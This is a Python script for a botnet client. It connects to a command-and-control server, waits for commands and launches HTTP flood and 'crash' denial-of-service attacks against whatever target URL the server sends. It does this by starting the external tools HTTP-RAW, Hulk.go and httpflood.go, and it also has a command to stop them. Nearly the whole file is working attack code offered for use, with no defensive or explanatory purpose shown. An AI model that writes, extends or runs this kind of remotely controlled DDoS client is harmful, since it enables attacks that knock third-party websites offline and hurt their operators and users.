import socket
import subprocess
import os
from datetime import datetime

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1111

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_HOST, SERVER_PORT))

print(f"⚡ Connected to C2 Server at {SERVER_HOST}:{SERVER_PORT}")

def format_duration(seconds):
    mins, secs = divmod(seconds, 60)
    return f"{mins:02d}m {secs:02d}s"

def execute_command(cmd):
    start_time = datetime.now()
    try:
        if cmd.startswith("http-raw"):
            parts = cmd.split()
            if len(parts) < 3:
                print("❌ Usage: http-raw <url> <time>")
                return
            print(f"🚀 Starting HTTP-RAW attack on {parts[1]}")
            subprocess.Popen(["node", "HTTP-RAW", parts[1], parts[2]])

        elif cmd.startswith("crash"):
            parts = cmd.split()
            if len(parts) < 3:
                print("❌ Usage: crash <url> <GET/POST>")
                return
            print(f"💥 Starting Crash attack on {parts[1]}")
            subprocess.Popen(["go", "run", "Hulk.go", "-site", parts[1], "-data", parts[2]])

        elif cmd.startswith("httpflood"):
            parts = cmd.split()
            if len(parts) < 5:
                print("❌ Usage: httpflood <url> <threads> <GET/POST> <time>")
                return
            print(f"🌊 Starting HTTPFlood with {parts[2]} threads")
            subprocess.Popen(["go", "run", "httpflood.go", parts[1], parts[2], parts[3], parts[4], "nil"])

        elif cmd.startswith("stop"):
            print("🛑 Stopping all attacks")
            os.system("pkill -f HTTP-RAW")
            os.system("pkill -f Hulk.go")
            os.system("pkill -f httpflood.go")

        duration = (datetime.now() - start_time).total_seconds()
        print(f"✅ Command executed in {format_duration(int(duration))}")

    except Exception as e:
        print(f"❌ Error: {e}")

while True:
    try:
        data = client.recv(1024).decode().strip()
        if data:
            print(f"📡 Received command: {data}")
            execute_command(data)
    except Exception as e:
        print(f"❌ Disconnected: {e}")
        break